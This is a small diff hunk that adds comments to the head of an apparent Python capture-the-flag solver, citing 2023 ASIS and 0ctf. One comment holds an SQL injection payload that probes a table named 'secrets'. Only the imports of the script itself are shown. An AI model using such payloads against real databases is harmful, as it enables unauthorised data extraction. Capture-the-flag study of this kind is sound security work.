@@ -1,3 +1,6 @@
+
+##payload:x'or(table`secrets`)rlike'a'or'a'like'b
+##reference：2023 ASIS Black Hat；2023 0ctf；
 import string 
 import itertools
 import requests
